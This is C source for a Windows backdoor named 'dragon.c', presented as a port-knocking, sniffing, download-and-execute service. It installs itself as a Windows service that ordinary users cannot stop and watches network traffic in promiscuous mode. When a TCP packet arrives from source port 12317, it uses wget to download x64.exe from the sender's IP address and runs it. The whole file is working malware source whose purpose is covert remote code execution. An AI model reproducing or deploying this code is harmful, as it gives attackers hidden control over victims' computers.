/* dragon.c: sniffing, non binding, reverse down/exec, portknocking service
 * Based on cd00r.c by fx@phenoelit.de and helldoor.c by drizzt@drizzt.it
 * 
 * You need libpcap
 * 
 * Compile:
 *	gcc.exe dragon.c -lwpcap -lws2_32 -o dragon.exe
 *
 * To Do:
 * 	Change to have each service dispatch for each interface
 * 	Change to support IPv6
 * 	Remove Debug Logging
 *
 * By __int128 <jarsnah12@gmail.com>
 */
#include <windows.h>
#include <stdio.h>
#include "pcap.h"

#define PCAP_SRC_IF_STRING "rpcap://"
#define PCAP_OPENFLAG_PROMISCUOUS   1
#define LOGFILE "C:\\debug.txt"

SERVICE_STATUS          ServiceStatus; 
SERVICE_STATUS_HANDLE   hStatus; 

/* 4 bytes IP address */
typedef struct ip_address{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct ip_header{
    u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
    u_char  tos;            // Type of service 
    u_short tlen;           // Total length 
    u_short identification; // Identification
    u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
    u_char  ttl;            // Time to live
    u_char  proto;          // Protocol
    u_short crc;            // Header checksum
    ip_address  saddr;      // Source address
    ip_address  daddr;      // Destination address
    u_int   op_pad;         // Option + Padding
}ip_header;

/* TCP header */
typedef struct tcp_header{
  uint16_t sport;
  uint16_t dport;
  uint32_t seq;
  uint32_t ack;
  uint8_t  data_offset;  // 4 bits
  uint8_t  flags;
  uint16_t window_size;
  uint16_t checksum;
  uint16_t urgent_p;
} tcp_header;
 
/* prototype of the packet handler */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

/* prototype of the ServiceMain handler */
void ServiceMain(int argc, char** argv); 

/* prototype of the Control Handler */
void ControlHandler(DWORD request); 

int WriteToLog(char* str)
{
   FILE* log;
   log = fopen(LOGFILE, "a+");
   if (log == NULL)
      return -1;
   fprintf(log, "%s\n", str);
   fclose(log);
   return 0;
}

void main() 
{ 
   SERVICE_TABLE_ENTRY ServiceTable[2];
   ServiceTable[0].lpServiceName = "Dragon";
   ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

   ServiceTable[1].lpServiceName = NULL;
   ServiceTable[1].lpServiceProc = NULL;
   // Start the control dispatcher thread for our service
   StartServiceCtrlDispatcher(ServiceTable);  
}

void ServiceMain(int argc, char** argv) 
{ 
 
   ServiceStatus.dwServiceType = SERVICE_WIN32; 
   ServiceStatus.dwCurrentState = SERVICE_START_PENDING; 
   //ServiceStatus.dwControlsAccepted   =  SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; // Uncomment this line if you want the user the ability to stop the service. 
   ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN; // At the very least allow the service to be shut down for reboots.
   ServiceStatus.dwWin32ExitCode = 0; 
   ServiceStatus.dwServiceSpecificExitCode = 0; 
   ServiceStatus.dwCheckPoint = 0; 
   ServiceStatus.dwWaitHint = 0; 
 
   hStatus = RegisterServiceCtrlHandler("Dragon", (LPHANDLER_FUNCTION)ControlHandler); 
   if (hStatus == (SERVICE_STATUS_HANDLE)0) 
   { 
      // Registering Control Handler failed
      return; 
   }  

   // We report the running status to SCM. 
   ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
   SetServiceStatus (hStatus, &ServiceStatus);
 
   //MEMORYSTATUS memory;
   // The worker loop of a service
   while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
   {
		//DO Magic Here
		pcap_if_t *alldevs;
		pcap_if_t *d;
		int inum;
		int i=0;
		pcap_t *adhandle;
		char errbuf[PCAP_ERRBUF_SIZE];
		u_int netmask;
		char packet_filter[] = "tcp";
		struct bpf_program fcode;

		/* Retrieve the device list */
		if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
		{
			char buffer[256];
			sprintf(buffer, "Error in pcap_findalldevs: %s\n", errbuf);
			WriteToLog(buffer);
			exit(1);
		}
    
		/* Print the list */
		for(d=alldevs; d; d=d->next)
		{
			char buffer[256];
			sprintf(buffer, "%d. %s", ++i, d->name);
			WriteToLog(buffer);
		}

		if(i==0)
		{
			char buffer[256];
			sprintf(buffer, "\nNo interfaces found! Make sure WinPcap is installed.\n");
			WriteToLog(buffer);
			return;
		}

		inum = 1; // force to listen on the first listed interface. 
		/*
		if(inum < 1 || inum > i)
		{
			char buffer[256];
			sprintf(buffer, "\nInterface number out of range.\n");
			WriteToLog(buffer);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return;
		}
		*/
		/* Jump to the selected adapter */
		
		for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
    	
		/* Open the adapter */
		if ( (adhandle= pcap_open(d->name,  // name of the device
								 65536,     // portion of the packet to capture. 
											// 65536 grants that the whole packet will be captured on all the MACs.
								 PCAP_OPENFLAG_PROMISCUOUS,         // promiscuous mode
								 1000,      // read timeout
								 NULL,      // remote authentication
								 errbuf     // error buffer
								 ) ) == NULL)
		{
			char buffer[256];
			sprintf(buffer,"\nUnable to open the adapter. %s is not supported by WinPcap\n");
			WriteToLog(buffer);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return;
		}
    
		/* Check the link layer. We support only Ethernet for simplicity. */
		if(pcap_datalink(adhandle) != DLT_EN10MB)
		{
			char buffer[256];
			sprintf(buffer,"\nThis program works only on Ethernet networks.\n");
			WriteToLog(buffer);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return;
		}
    
    if(d->addresses != NULL)
        /* Retrieve the mask of the first address of the interface */
        netmask=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
    else
        /* If the interface is without addresses we suppose to be in a C class network */
        netmask=0xffffff; 


    //compile the filter
    if (pcap_compile(adhandle, &fcode, packet_filter, 1, netmask) <0 )
    {
		char buffer[256];
        sprintf(buffer,"\nUnable to compile the packet filter. Check the syntax.\n");
        WriteToLog(buffer);
		/* Free the device list */
        pcap_freealldevs(alldevs);
        return;
    }
    
    //set the filter
    if (pcap_setfilter(adhandle, &fcode)<0)
    {
		char buffer[256];
        sprintf(buffer,"\nError setting the filter.\n");
		WriteToLog(buffer);
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return;
    }
    char buffer[256];
    sprintf(buffer, "\nlistening on %s...\n", d->description);
    WriteToLog(buffer);
	
    /* At this point, we don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);
    
    /* start the capture */
    pcap_loop(adhandle, 0, packet_handler, NULL);
		
		// Magic has been completed (though we're in a loop)
   }
   return; 
}

void ControlHandler(DWORD request) 
{ 
   switch(request) 
   { 
      case SERVICE_CONTROL_SHUTDOWN: 

         ServiceStatus.dwWin32ExitCode = 0; 
         ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
         SetServiceStatus (hStatus, &ServiceStatus);
         return; 
        
      default:
         break;
    } 
 
    // Report current status
    SetServiceStatus (hStatus, &ServiceStatus);
 
    return; 
}

/* Callback function invoked by libpcap for every incoming packet */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    struct tm *ltime;
    char timestr[16];
    ip_header *ih;
	tcp_header *th;
    u_int ip_len;
    u_short sport,dport;
    time_t local_tv_sec;

    /* convert the timestamp to readable format */
    local_tv_sec = header->ts.tv_sec;
    ltime=localtime(&local_tv_sec);
    strftime( timestr, sizeof timestr, "%H:%M:%S", ltime);
	
    /* retireve the position of the ip header */
    ih = (ip_header *) (pkt_data + 14); //length of ethernet header

	if (ih->proto == 6) 
	{
		
		/* retrieve the position of the tcp header */
		ip_len = (ih->ver_ihl & 0xf) * 4;
		th = (tcp_header *) ((u_char*)ih + ip_len);

		/* convert from network byte order to host byte order */
		sport = ntohs( th->sport );
		dport = ntohs( th->dport );
	
		if (sport == 12317) { //Change this if you want it to listen on a different port.
		
			char buffer[256];
			sprintf(buffer,"\nRecieved Happy Magic Packet\n");
			WriteToLog(buffer);
		
			// delete x.exe in case it already exsists.
			remove( "c:\\windows\\system32\\x64.exe" );  //Change this and the next few lines if you want to name your binary something else.
			
			char cmd[255];	
			sprintf(cmd, "\"c:\\windows\\system\\wget.exe http://%d.%d.%d.%d/x64.exe\"", ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4 ); 
			system(cmd);
			system("c:\\windows\\system32\\x64.exe");
		}
	} 
}
